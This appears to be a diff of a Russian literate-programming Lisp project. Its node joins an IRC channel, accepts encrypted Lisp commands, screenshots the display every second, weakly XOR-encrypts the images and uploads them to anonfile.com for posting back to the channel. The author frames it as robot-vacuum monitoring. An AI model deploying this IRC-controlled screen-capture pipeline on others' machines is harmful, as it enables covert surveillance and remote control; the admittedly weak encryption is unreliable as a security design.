@@ -77,7 +77,7 @@
 
   (defparameter *watchdog-timer* 0)
 
-  (defparameter *watchdog-timer-max* 20)
+  (defparameter *watchdog-timer-max* 200)
 
   (defparameter *supervisor-stop-flag* nil)
 
@@ -96,7 +96,6 @@
   (defparameter *thread-operations-lock*
     (bt:make-lock "thread-operations-lock"))
 
-
   ;; irc
   <<irc>>
 
@@ -109,13 +108,12 @@
                                  (bt:all-threads))))
         (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                 :do (when (equal name nm)  (return th))))
-                 (kill (th)  (progn
-                               (handler-case (bt:destroy-thread th)
-                                 ;; happens, when thread destroyed already
-                                 (TYPE-ERROR () nil))
-                               (setf *watchdog-timer* 0)))
+                 (kill (th)  (handler-case (bt:destroy-thread th)
+                               ;; happens, when thread destroyed already
+                               (TYPE-ERROR () nil)))
                  (kill-irc (th)
                    (kill th)
+                   (setf *watchdog-timer* 0)
                    (setf *connection-established-flag* nil)))
           ;; if there is no irs-thread then start it
           (when (and (null (fnd "irc-th"))       ;; no irc-th
@@ -139,7 +137,7 @@
           ;; kill latecomers shot-threads if there are too many
           ;; TODO: debug it!
           (when (> (length *shot-threads*) *max-shot-thread-cnt*)
-            (dbg "many threads~%")
+            (dbg "::supervisor-lambda: many threads~%")
             (loop :for (shot-th . time) :in *shot-threads* :do
                  (dbg "~A . ~A~%" shot-th time)
                  (when (> (- (get-universal-time) time)
@@ -160,7 +158,8 @@
                               (*irc-serv* . ,*irc-serv*)
                               (*irc-chan* . ,*irc-chan*)
                               (*irc-lock* . ,*irc-lock*)
-                              (*irc-conn* . ,*irc-conn*))))
+                              (*irc-conn* . ,*irc-conn*)
+                              (*watchdog-timer* . ,*watchdog-timer*))))
               (bt:with-lock-held (*thread-operations-lock*)
                 (push (cons (bt:make-thread #'shot :name "shot-th"
                                             :initial-bindings bindings)
@@ -374,19 +373,6 @@ irc-канала. Она должна возвращать T чтобы пред
 
   ;; (encrypt
   ;;  (flex:string-to-octets
-  ;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
-  ;;   :external-format :utf-8)
-  ;;  3783992823)
-
-  ;; (encrypt
-  ;;  (flex:string-to-octets
-  ;;   ;; "(unschedule-timer *shot-timer*)"
-  ;;   "(schedule-timer *shot-timer* 1 :repeat-interval 1)"
-  ;;   :external-format :utf-8)
-  ;;  3783995947)
-
-  ;; (encrypt
-  ;;  (flex:string-to-octets
   ;;   "(progn (quit))"
   ;;   :external-format :utf-8)
   ;;  3783992823)
@@ -437,81 +423,155 @@ irc-канала. Она должна возвращать T чтобы пред
 
 * Snapshot function
 
-Сама функция скриншота должна сделать скриншот и обработать его, а потом
-реинициализировать свой таймер
+Сама функция скриншота должна каждую секунду делать скриншот, загружать
+его на файлообменник, получать ссылку на файл и отправлять ее в
+irc-канал.
+
+В будущем, когда я добавлю веб-камеру к роботу-пылесосу, такой же процесс
+можно будет реализовать и для картинок с неё. Аналогичный процесс
+планируется для значений температуры и влажности.
+
+За формирование скриншота отвечает кодовый блок ~x_snapshot~ и
+одноименная функция.
+
+Чтобы сократить количество передаваемых данных мы используем несколько
+приемов.
+
+Во-первых, мы будем передавать двуцветные черно-белые изображения - по
+ним легко визуально распознать то что происходит, но при этом мы можем
+тратить только один бит на точку. Мы будем упаковывать по 8 таких бит в
+байт и формировать PNG-файл с цветовым пространством 256 градаций
+серого. За эту часть работы отвечает ~pack-img~.
+
+:NOTE:
+
+  [TODO:gmm] Возможно, оптимальнее было бы найти способ сохранять
+  правильную модель цвета, на это указывает, например вот такой пассаж о
+  PNG-формате:
+
+  #+BEGIN_EXAMPLE
+    В заголовке IHDR указана ширина и высота, глубина цвета (1,2,4,8 или
+    16 бит) и формат пикселя - Grayscale, RGB, Palette, GrayscaleAlpha,
+    RGBA, там же тип компрессии (пока что всегда 0: zlib) и тип фильтрации
+    (тоже всегда 0, что означает 5 фильтров предикторов None, Sub, Up,
+    Average и Paeth, с выбором одного из 5 в начале каждой строки).
+  #+END_EXAMPLE
+
+  Но это требует глубже разобраться в PNG-формате, хотя и открывает
+  возможности по управлению сжатием и добавлению текстовых данных в
+  файлы.
+
+:END:
+
+Второй способ сократить количество передаваемых данных - передавать не
+все изображение, а только те точки, в которых оно отличается от
+предыдущего переданного изображения.
+
+Однако, в этом случае правильное отображение зависит от того, получил ли
+приемник начальное изображение.
+
+Решение состоит в том, чтобы передавать полное изображение (ключевой
+кадр) один раз в последовательности из нескольких. Остальные изображения
+будут содержать только отличающиеся точки относительно предыдущего
+состояния. Несмотря на то, что черные точки тоже передаются -
+эксперименты показывают, что PNG эффективно сжимает большие черные
+участки.
+
+Кроме того, по соображениям безопасности стоит шифровать изображения
+после сжатия. Это шифрование нельзя назвать стойким, возможна атака на
+открытый текст, так как формат PNG предсказуем. Кроме того, в качестве
+ключа мы гамму, генератор которой инициализируется таймштампом узла (в
+канале могут быть одновременно несколько узлов).
+
+В общем, шифрование так себе ([TODO:gmm]), но большего пока не требуется
+даже для отправляемых узлу комманд, хотя тут и существуют угрозы
+безопасности.
 
 #+NAME: shot
 #+BEGIN_SRC lisp :noweb yes
-  <<x_display>>
-  <<pack_image>>
-  <<unpack_image>>
+  ;; x_snapshot
+  <<x_snapshot>>
+
+  ;; pack_image
+  <<pack_img>>
+
+  ;; wrap_img
+  <<wrap_img>>
+
+  ;; get_img_diff
+  (declaim (inline get-img-diff))
+
+  (defun get-img-diff (dims prev snap)
+    (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
+      (do ((qy 0 (incf qy)))
+          ((= qy (car dims)))
+        (declare (type fixnum qy))
+        (do ((qx 0 (incf qx)))
+            ((= qx (cadr dims)))
+          (declare (type fixnum qx))
+          (setf (aref diff qy qx)
+                (logxor (aref prev qy qx)
+                        (aref snap qy qx)))))
+      diff))
+
+  ;; shot
+  (let ((prev)
+        (cnt 9999))
+    (defun shot ()
+      (declare (inline get-img-diff))
+      (let* ((snap (pack-img (x-snapshot)))
+             (dims (array-dimensions snap)))
+        (if (> cnt 4)
+            (progn
+              (wrap-img "~A" dims snap)
+              (setf prev snap)
+              (setf cnt 0))
+            ;; else
+            (let ((diff (get-img-diff dims prev snap)))
+              (wrap-img (format nil "~~A_~A" cnt) dims diff)
+              (setf prev snap)
+              (incf cnt))))))
+#+END_SRC
+
+** Wrap image
+
+За шифрование изображения, загрузку его на файлообменник, получение
+ссылки и отправку её в канал отвечает функция ~wrap-img~. Она выполняет
+следующую последовательность операций:
+- Формирует PNG-объект из двухмерного массива точек изображения с помощью
+  функции ~get-png-obj~.
+- Кодирует его в PNG-формат с помощью ~get-png-seq~ получая octets.
+- Складывает эти octets c гаммой, с помощью уже знакомой функции
+  ~encrypt~, получая base64-string
+- Заливает эту base64-string на файлообменник с помощью функции
+  ~anon-file-upload~. Здесь возможны варианты - [TODO:gmm] -
+  файлообменник может дать сбой, в этом случае следует попытаться
+  перезалить файл. Если несколько попыток оказались неудачны - надо
+  сделать так, чтобы следующее отправляемое изображение было ключевым
+  кадром, а не diff-ом, так как потеряный diff не даст нам возможности
+  распознать следующие изображения последовательности.
+- Полученную из файлообменника ссылку отправляет в irc-канал. В случае
+  ошибки отправляет туда содержание ошибки.
+
+#+NAME: wrap_img
+#+BEGIN_SRC lisp :noweb yes
+  ;; get_png_obj
+  <<get_png_obj>>
+
+  ;; get_png_seq
+  <<get_png_seq>>
+
+  ;; upload
   <<upload>>
 
-  (defun shot ()
-    ;; (dbg "~A~%" *shot-threads*)
-    (sendmsg "shot started")
-    (sleep 100))
-
-  ;; (defparameter *shot-timer*
-  ;;   (make-timer #'(lambda ()
-  ;;                   (shot))
-  ;;               :name "shot" :thread t))
-
-  ;; (defparameter *stop* nil)
-
-  ;; (let ((prev)
-  ;;       (cnt 9999))
-  ;;   (defun shot ()
-  ;;     (let* ((snap (pack-image (x-snapshot)))
-  ;;            (dims (array-dimensions snap)))
-  ;;       (if (> cnt 4)
-  ;;           (progn
-  ;;             (save "~A" dims snap)
-  ;;             (setf prev snap)
-  ;;             (setf cnt 0))
-  ;;           ;; else
-  ;;           (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
-  ;;             (do ((qy 0 (incf qy)))
-  ;;                 ((= qy (car dims)))
-  ;;               (declare (type fixnum qy))
-  ;;               (do ((qx 0 (incf qx)))
-  ;;                   ((= qx (cadr dims)))
-  ;;                 (declare (type fixnum qx))
-  ;;                 (setf (aref xored qy qx)
-  ;;                       (logxor (aref prev qy qx)
-  ;;                               (aref snap qy qx)))))
-  ;;             (save (format nil "~~A_~A" cnt) dims xored)
-  ;;             (setf prev snap)
-  ;;             (incf cnt))))))
-
-  ;; (schedule-timer *shot-timer* 1 :repeat-interval 1)
-
-
-
-  (defun save-png (width height pathname-str image
-                   &optional (color-type :truecolor-alpha))
-    (let* ((png (make-instance 'zpng:png :width width :height height
-                               :color-type color-type))
-           (vector (make-array ;; displaced vector - need copy for save
-                    (* height width (zpng:samples-per-pixel png))
-                    :displaced-to image :element-type '(unsigned-byte 8))))
-      ;; Тут применен потенциально опасный трюк, когда мы создаем
-      ;; объект PNG без данных, а потом добавляем в него данные,
-      ;; используя неэкспортируемый writer.
-      ;; Это нужно чтобы получить третью размерность массива,
-      ;; который мы хотим передать как данные и при этом
-      ;; избежать создания для этого временного объекта
-      (setf (zpng::%image-data png) (copy-seq vector))
-      (zpng:write-png png pathname-str)))
-
-  (defun save (frmt-filename-str dims image)
+  ;; wrap-img
+  (defun wrap-img (frmt-filename-str dims image)
     (block save-block
       (let* ((height     (car  dims))
              (width      (cadr dims))
              (png        (get-png-obj width height image :grayscale))
-             (png-seq    (get-png-sequence png))
+             (png-seq    (get-png-seq png))
              (base64     (encrypt png-seq *irc-sess*))
-             (decoded    (decrypt base64 *irc-sess*))
              (filename   (format nil frmt-filename-str
                                  (format nil "~A" (get-universal-time))))
              (upload-ret (handler-case
@@ -539,45 +599,19 @@ irc-канала. Она должна возвращать T чтобы пред
         )))
 #+END_SRC
 
-** unpack_procedure
+*** Get PNG object
 
-#+NAME: unpack_procedure
+Функция ~get-png-obj~ вызывается из ~wrap-img~ и возвращает PNG-объект с
+содержимым, сформированным из переданного в нее двумерного массива.
+
+#+NAME: get_png_obj
 #+BEGIN_SRC lisp
-  (let* ((fname-in #P"~/Downloads/3784024465")
-         (enc  (alexandria:read-file-into-string fname-in :external-format :utf-8))
-         (dec  (decrypt enc *irc-sess*))
-         ;; (dec (alexandria:read-file-into-byte-vector #P"~/Documents/ab-pack.png"))
-         (png (let ((png-read::*png-file* "fake-file"))
-                 (flex:with-input-from-sequence (stream dec)
-                   (png-read:read-png-datastream stream))))
-         (image-data (png-read:image-data png))
-         ;; reverse
-         (dims   (subseq (array-dimensions image-data) 0 2))
-         (height (cadr dims))
-         (width  (car  dims))
-         (image ;; меняем размерности X и Y местами
-          (let ((result (make-array (list height width)
-                                    :element-type '(unsigned-byte 8))))
-            (do ((y 0 (incf y)))
-                ((= y height))
-              (do ((x 0 (incf x)))
-                  ((= x width))
-                (setf (aref result y x)
-                      (aref image-data x y))))
-            result))
-         ;; unpacking
-         (unpack (unpack-image image))
-         (unpack-dims (array-dimensions unpack))
-         (new-width (cadr unpack-dims))
-         (pathname-str "~/Documents/unpack-big.png")
-         )
-    (let* ((png (make-instance 'zpng:png
-                               :width new-width
-                               :height height
-                               :color-type :grayscale))
+  (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
+    (let* ((png (make-instance 'zpng:png :width width :height height
+                               :color-type color-type))
            (vector (make-array ;; displaced vector - need copy for save
-                    (* height new-width (zpng:samples-per-pixel png))
-                    :displaced-to unpack :element-type '(unsigned-byte 8))))
+                    (* height width (zpng:samples-per-pixel png))
+                    :displaced-to image :element-type '(unsigned-byte 8))))
       ;; Тут применен потенциально опасный трюк, когда мы создаем
       ;; объект PNG без данных, а потом добавляем в него данные,
       ;; используя неэкспортируемый writer.
@@ -585,10 +619,199 @@ irc-канала. Она должна возвращать T чтобы пред
       ;; который мы хотим передать как данные и при этом
       ;; избежать создания для этого временного объекта
       (setf (zpng::%image-data png) (copy-seq vector))
-      (zpng:write-png png pathname-str)))
+      png))
 #+END_SRC
 
-** X-Display
+*** Get PNG sequence
+
+Функция ~get-png-seq~ возвращает представление PNG-файла в виде octets.
+
+#+NAME: get_png_seq
+#+BEGIN_SRC lisp
+  (defun get-png-seq (png)
+    (flex:with-output-to-sequence (stream)
+      (zpng:write-png-stream png stream)))
+#+END_SRC
+
+*** Upload
+
+#+NAME: upload
+#+BEGIN_SRC lisp
+  ;; (setf drakma:*header-stream* *standard-output*)
+
+  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")
+
+  (defparameter *additional-headers*
+    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
+      ("Accept-Charset" . "utf-8")))
+
+  (defun get-csrf (text)
+    (loop :for str :in (split-sequence:split-sequence #\Newline text)
+       :do (multiple-value-bind (match-p result)
+               (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
+             (when match-p (return (aref result 0))))))
+
+  (defun get-cookies-alist (cookie-jar)
+    "Получаем alist с печеньками из cookie-jar"
+    (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
+         (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))
+
+  (defun anon-file-upload (filename content)
+    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
+      ;; load mainpage for cookies, headers and csrf
+      (multiple-value-bind (body-or-stream ;; status-code headers uri
+                            ;;stream must-close reason-phrase
+                            )
+          (drakma:http-request "https://anonfile.com/"
+                               :user-agent *user-agent*
+                               :redirect 10
+                               :force-binary t
+                               :cookie-jar cookie-jar
+                               :additional-headers *additional-headers*)
+        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
+               (csrf (get-csrf text))
+               (boundary "---------------------------196955623314664815241571979859")
+               (type-header (format nil "multipart/form-data; boundary=~A" boundary))
+               (new-headers `(("Accept" . "application/json")
+                              ("Accept-Language" . "en-US,en;q=0.5")
+                              ("Cache-Control" . "no-cache")
+                              ("X-Requested-With" . "XMLHttpRequest")
+                              ("X-CSRF-Token" . ,csrf)
+                              ("Origin" . "https://anonfile.com")
+                              ("Referer" . "https://anonfile.com/")
+                              ("Content-Type" . ,type-header)
+                              ("TE" . "Trailers"))))
+          (multiple-value-bind (body-or-stream ;; status-code headers uri
+                                ;;stream must-close reason-phrase
+                                )
+              (drakma:http-request
+               "https://api.anonfile.com/upload"
+               ;; "http://localhost:9993/upload"
+               :user-agent *user-agent*
+               :method :post
+               :form-data t
+               :content (format nil "--~A
+  Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
+  Content-Type: application/octet-stream
+
+  ~A
+  --~A--" boundary filename content boundary)
+               :cookie-jar cookie-jar
+               :additional-headers new-headers
+               :force-binary t)
+            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
+
+  ;; (anon-file-upload "555f.txt" "the content")
+
+
+  ;; (alexandria:write-string-into-file
+  ;;  (cl-base64:usb8-array-to-base64-string
+  ;;   (alexandria:read-file-into-byte-vector #P"png.png"))
+  ;;  #P"test.txt" :if-exists :supersede :external-format :utf-8)
+
+  ;; (alexandria:write-byte-vector-into-file
+  ;;  (cl-base64:base64-string-to-usb8-array
+  ;;   (alexandria:read-file-into-string #P"test.txt" :external-format :utf-8))
+  ;;  #P"test2" :if-exists :supersede)
+
+
+  ;; (print (get-cookies-alist cookie-jar))
+  ;; (print headers)
+  ;; (setf drakma" . "drakma-default-external-format* :UTF-8)
+
+  ;; (in-package :rigidus)
+
+  ;; (ql:quickload "rigidus")
+
+  ;; (restas:define-route upload ("/upload")
+  ;;   "<form enctype=\"multipart/form-data\" method=\"post\">
+  ;;    <input type=\"file\" name=\"file\">
+  ;;    <input type=\"submit\" value=\"Отправить\">
+  ;;    </form>")
+
+  ;; (restas:define-route upload-post ("/upload" :method :post)
+  ;;   (let ((file-info (hunchentoot:post-parameter "file")))
+  ;;     ;; (hunchentoot:escape-for-html
+  ;;     ;;  (alexandria:read-file-into-string (first file-info)))
+  ;;     (format nil "~A"
+  ;;             (bprint file-info))))
+#+END_SRC
+
+** Packing image
+
+Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.
+
+Мы берем полноцветное изображение и используем два вложенных цикла,
+проходя по ~Y~ и ~X~ чтобы обработать каждую точку. После обработки одна
+точка должна занимать только один бит.
+
+Мы также должны упаковать по восемь точек в байт, но если размер
+изображения в точках не кратен байту, то нужно дополнить недостающие
+точки. За это отвечате внутренний макрос ~byte-finiser~, который
+вызывается по мере накопления значений в байте и в конце обработки
+строки, если это необходимо.
+
+#+NAME: pack_img
+#+BEGIN_SRC lisp
+  (defun pack-img (image)
+    (declare (optimize (speed 3) (safety 0)))
+    (let* ((dims (array-dimensions image))
+           (height (car dims))
+           (width (cadr dims))
+           (new-width (ash (logand (+ width 7) (lognot 7)) -3))
+           (need-finisher (not (equal new-width (ash width -3))))
+           (result (make-array (list height new-width)
+                               :element-type '(unsigned-byte 8)))
+           (bp 8)
+           (acc 0))
+      (declare (type (unsigned-byte 8) acc)
+               (type fixnum bp)
+               (type fixnum width)
+               (type fixnum new-width)
+               (type fixnum height))
+      (macrolet ((byte-finisher (acc qy qx bp)
+                   `(progn
+                      ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
+                      (setf (aref result ,qy (ash ,qx -3)) ,acc)
+                      (setf ,acc 0)
+                      (setf ,bp 8))))
+        (do ((qy 0 (incf qy)))
+            ((= qy height))
+          (declare (type fixnum qy))
+          (do ((qx 0 (incf qx)))
+              ((= qx width) (when need-finisher
+                              (byte-finisher acc qy qx bp)))
+            (declare (type fixnum qx))
+            (let* ((avg (floor (+ (aref image qy qx 0)
+                                  (aref image qy qx 1)
+                                  (aref image qy qx 2))
+                               3))
+                   (pnt (ash avg -7)))
+              (declare (type fixnum avg))
+              (declare (type fixnum pnt))
+              (decf bp)
+              (setf acc (logior acc (ash pnt bp)))
+              (when (= bp 0)
+                (byte-finisher acc qy qx bp))))
+          ;; (format t "~%")
+          ))
+      result))
+
+  ;; (disassemble 'pack-img)
+
+  ;; TEST: pack-img
+  ;; (time
+  ;;  (let* ((image (pack-img (x-snapshot)))
+  ;;         (dims (array-dimensions image)))
+  ;;    (save-png (cadr dims)
+  ;;              (car dims)
+  ;;              (format nil "~A" (gensym "FILE"))
+  ;;              image
+  ;;              :grayscale)))
+#+END_SRC
+
+** X-Snapshot
 
 Этот раздел описывает библиотечные функции, которые необходимы для
 получения снимков экрана
@@ -606,7 +829,7 @@ irc-канала. Она должна возвращать T чтобы пред
 чтобы ускорить работу, но пока нам требуется отлаживаемость а не
 скорость.
 
-#+NAME: x_display
+#+NAME: x_snapshot
 #+BEGIN_SRC lisp :padline no
   (defmacro with-display (host (display screen root-window) &body body)
     `(let* ((,display (xlib:open-display ,host))
@@ -702,86 +925,15 @@ irc-канала. Она должна возвращать T чтобы пред
   ;; (x-snapshot :path "x-snapshot-true-color.png")
 #+END_SRC
 
-** Packing image
+* Old
 
-Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.
-
-Мы берем полноцветное изображение и используем два вложенных цикла,
-проходя по ~Y~ и ~X~ чтобы обработать каждую точку. После обработки одна
-точка должна занимать только один бит.
-
-Мы также должны упаковать по восемь точек в байт, но если размер
-изображения в точках не кратен байту, то нужно дополнить недостающие
-точки. За это отвечате внутренний макрос ~byte-finiser~, который
-вызывается по мере накопления значений в байте и в конце обработки
-строки, если это необходимо.
-
-#+NAME: pack_image
+#+NAME: save_png
 #+BEGIN_SRC lisp
-  (defun pack-image (image)
-    (declare (optimize (speed 3) (safety 0)))
-    (let* ((dims (array-dimensions image))
-           (height (car dims))
-           (width (cadr dims))
-           (new-width (ash (logand (+ width 7) (lognot 7)) -3))
-           (need-finisher (not (equal new-width (ash width -3))))
-           (result (make-array (list height new-width)
-                               :element-type '(unsigned-byte 8)))
-           (bp 8)
-           (acc 0))
-      (declare (type (unsigned-byte 8) acc)
-               (type fixnum bp)
-               (type fixnum width)
-               (type fixnum new-width)
-               (type fixnum height))
-      (macrolet ((byte-finisher (acc qy qx bp)
-                   `(progn
-                      ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
-                      (setf (aref result ,qy (ash ,qx -3)) ,acc)
-                      (setf ,acc 0)
-                      (setf ,bp 8))))
-        (do ((qy 0 (incf qy)))
-            ((= qy height))
-          (declare (type fixnum qy))
-          (do ((qx 0 (incf qx)))
-              ((= qx width) (when need-finisher
-                              (byte-finisher acc qy qx bp)))
-            (declare (type fixnum qx))
-            (let* ((avg (floor (+ (aref image qy qx 0)
-                                  (aref image qy qx 1)
-                                  (aref image qy qx 2))
-                               3))
-                   (pnt (ash avg -7)))
-              (declare (type fixnum avg))
-              (declare (type fixnum pnt))
-              (decf bp)
-              (setf acc (logior acc (ash pnt bp)))
-              (when (= bp 0)
-                (byte-finisher acc qy qx bp))))
-          ;; (format t "~%")
-          ))
-      result))
+  <<upload>>
+  <<unpack_img>>
 
-  ;; (disassemble 'pack-image)
-
-  ;; TEST: pack-image
-  ;; (time
-  ;;  (let* ((image (pack-image (x-snapshot)))
-  ;;         (dims (array-dimensions image)))
-  ;;    (save-png (cadr dims)
-  ;;              (car dims)
-  ;;              (format nil "~A" (gensym "FILE"))
-  ;;              image
-  ;;              :grayscale)))
-#+END_SRC
-
-** Save and Load
-
-Для целей отладки нам нужно уметь сохранять и загружать png-изображения
-
-#+NAME: save_and_load_png
-#+BEGIN_SRC lisp
-  (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
+  (defun save-png (width height pathname-str image
+                   &optional (color-type :truecolor-alpha))
     (let* ((png (make-instance 'zpng:png :width width :height height
                                :color-type color-type))
            (vector (make-array ;; displaced vector - need copy for save
@@ -794,12 +946,65 @@ irc-канала. Она должна возвращать T чтобы пред
       ;; который мы хотим передать как данные и при этом
       ;; избежать создания для этого временного объекта
       (setf (zpng::%image-data png) (copy-seq vector))
-      png))
+      (zpng:write-png png pathname-str)))
 
-  (defun get-png-sequence (png)
-    (flex:with-output-to-sequence (stream)
-      (zpng:write-png-stream png stream)))
+#+END_SRC
 
+** unpack_procedure
+
+#+NAME: unpack_procedure
+#+BEGIN_SRC lisp
+  (let* ((fname-in #P"~/Downloads/3784024465")
+         (enc  (alexandria:read-file-into-string fname-in :external-format :utf-8))
+         (dec  (decrypt enc *irc-sess*))
+         ;; (dec (alexandria:read-file-into-byte-vector #P"~/Documents/ab-pack.png"))
+         (png (let ((png-read::*png-file* "fake-file"))
+                 (flex:with-input-from-sequence (stream dec)
+                   (png-read:read-png-datastream stream))))
+         (image-data (png-read:image-data png))
+         ;; reverse
+         (dims   (subseq (array-dimensions image-data) 0 2))
+         (height (cadr dims))
+         (width  (car  dims))
+         (image ;; меняем размерности X и Y местами
+          (let ((result (make-array (list height width)
+                                    :element-type '(unsigned-byte 8))))
+            (do ((y 0 (incf y)))
+                ((= y height))
+              (do ((x 0 (incf x)))
+                  ((= x width))
+                (setf (aref result y x)
+                      (aref image-data x y))))
+            result))
+         ;; unpacking
+         (unpack (unpack-img image))
+         (unpack-dims (array-dimensions unpack))
+         (new-width (cadr unpack-dims))
+         (pathname-str "~/Documents/unpack-big.png")
+         )
+    (let* ((png (make-instance 'zpng:png
+                               :width new-width
+                               :height height
+                               :color-type :grayscale))
+           (vector (make-array ;; displaced vector - need copy for save
+                    (* height new-width (zpng:samples-per-pixel png))
+                    :displaced-to unpack :element-type '(unsigned-byte 8))))
+      ;; Тут применен потенциально опасный трюк, когда мы создаем
+      ;; объект PNG без данных, а потом добавляем в него данные,
+      ;; используя неэкспортируемый writer.
+      ;; Это нужно чтобы получить третью размерность массива,
+      ;; который мы хотим передать как данные и при этом
+      ;; избежать создания для этого временного объекта
+      (setf (zpng::%image-data png) (copy-seq vector))
+      (zpng:write-png png pathname-str)))
+#+END_SRC
+
+** Save and Load
+
+Для целей отладки нам нужно уметь сохранять и загружать png-изображения
+
+#+NAME: save_and_load_png
+#+BEGIN_SRC lisp
   ;; DEPRECATED, use explicit saving png-sequence by with-open-file
   ;; (defun save-png (pathname-str png)
   ;;   (zpng:write-png png pathname-str))
@@ -981,7 +1186,7 @@ SIMD-операций.
 
 #+NAME: unpack_image
 #+BEGIN_SRC lisp
-  (defun unpack-image (image)
+  (defun unpack-img (image)
     (declare (optimize (speed 3) (safety 0)))
     (let* ((dims (array-dimensions image))
            (height (car dims))
@@ -1014,123 +1219,20 @@ SIMD-операций.
 
   ;; TEST
   ;; (print
-  ;;  (unpack-image
-  ;;   (pack-image
+  ;;  (unpack-img
+  ;;   (pack-img
   ;;    (x-snapshot :width 31 :height 23))))
 
   ;; TEST
   ;; (time
   ;;  (let* ((image  (load-png "FILE1088"))
-  ;;         (unpack (unpack-image image))
+  ;;         (unpack (unpack-img image))
   ;;         (dims (array-dimensions unpack)))
   ;;    (save-png (cadr dims)
   ;;              (car dims)
   ;;              (format nil "~A" (gensym "FILE"))
   ;;              unpack
   ;;              :grayscale)))
-#+END_SRC
-
-** Upload
-
-#+NAME: upload
-#+BEGIN_SRC lisp
-  ;; (setf drakma:*header-stream* *standard-output*)
-
-  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")
-
-  (defparameter *additional-headers*
-    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
-      ("Accept-Charset" . "utf-8")))
-
-  (defun get-csrf (text)
-    (loop :for str :in (split-sequence:split-sequence #\Newline text)
-       :do (multiple-value-bind (match-p result)
-               (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
-             (when match-p (return (aref result 0))))))
-
-  (defun get-cookies-alist (cookie-jar)
-    "Получаем alist с печеньками из cookie-jar"
-    (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
-         (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))
-
-  (defun anon-file-upload (filename content)
-    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
-      ;; load mainpage for cookies, headers and csrf
-      (multiple-value-bind (body-or-stream status-code headers
-                                           uri stream must-close reason-phrase)
-          (drakma:http-request "https://anonfile.com/"
-                               :user-agent *user-agent*
-                               :redirect 10
-                               :force-binary t
-                               :cookie-jar cookie-jar
-                               :additional-headers *additional-headers*)
-        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
-               (csrf (get-csrf text))
-               (boundary "---------------------------196955623314664815241571979859")
-               (type-header (format nil "multipart/form-data; boundary=~A" boundary))
-               (new-headers `(("Accept" . "application/json")
-                              ("Accept-Language" . "en-US,en;q=0.5")
-                              ("Cache-Control" . "no-cache")
-                              ("X-Requested-With" . "XMLHttpRequest")
-                              ("X-CSRF-Token" . ,csrf)
-                              ("Origin" . "https://anonfile.com")
-                              ("Referer" . "https://anonfile.com/")
-                              ("Content-Type" . ,type-header)
-                              ("TE" . "Trailers"))))
-          (multiple-value-bind (body-or-stream status-code headers
-                                               uri stream must-close reason-phrase)
-              (drakma:http-request
-               "https://api.anonfile.com/upload"
-               ;; "http://localhost:9993/upload"
-               :user-agent *user-agent*
-               :method :post
-               :form-data t
-               :content (format nil "--~A
-  Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
-  Content-Type: application/octet-stream
-
-  ~A
-  --~A--" boundary filename content boundary)
-               :cookie-jar cookie-jar
-               :additional-headers new-headers
-               :force-binary t)
-            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
-
-  ;; (anon-file-upload "555f.txt" "the content")
-
-
-  ;; (alexandria:write-string-into-file
-  ;;  (cl-base64:usb8-array-to-base64-string
-  ;;   (alexandria:read-file-into-byte-vector #P"png.png"))
-  ;;  #P"test.txt" :if-exists :supersede :external-format :utf-8)
-
-  ;; (alexandria:write-byte-vector-into-file
-  ;;  (cl-base64:base64-string-to-usb8-array
-  ;;   (alexandria:read-file-into-string #P"test.txt" :external-format :utf-8))
-  ;;  #P"test2" :if-exists :supersede)
-
-
-  ;; (print (get-cookies-alist cookie-jar))
-  ;; (print headers)
-  ;; (setf drakma" . "drakma-default-external-format* :UTF-8)
-
-  ;; (in-package :rigidus)
-
-  ;; (ql:quickload "rigidus")
-
-  ;; (restas:define-route upload ("/upload")
-  ;;   "<form enctype=\"multipart/form-data\" method=\"post\">
-  ;;    <input type=\"file\" name=\"file\">
-  ;;    <input type=\"submit\" value=\"Отправить\">
-  ;;    </form>")
-
-  ;; (restas:define-route upload-post ("/upload" :method :post)
-  ;;   (let ((file-info (hunchentoot:post-parameter "file")))
-  ;;     ;; (hunchentoot:escape-for-html
-  ;;     ;;  (alexandria:read-file-into-string (first file-info)))
-  ;;     (format nil "~A"
-  ;;             (bprint file-info))))
 #+END_SRC
 
 * Assembly
